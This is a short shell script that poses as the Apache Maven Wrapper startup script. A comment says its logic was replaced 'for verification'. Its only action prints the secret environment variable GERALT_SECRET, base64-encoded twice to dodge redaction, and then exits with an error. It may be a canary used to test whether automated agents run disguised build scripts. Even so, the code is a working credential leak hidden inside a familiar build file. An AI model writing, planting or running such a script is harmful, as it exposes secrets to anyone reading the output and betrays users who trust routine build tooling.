#!/bin/sh
# ----------------------------------------------------------------------------
# Apache Maven Wrapper startup script, version 3.2.0
# (replaced for verification - original logic omitted)
# ----------------------------------------------------------------------------
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
exit 1
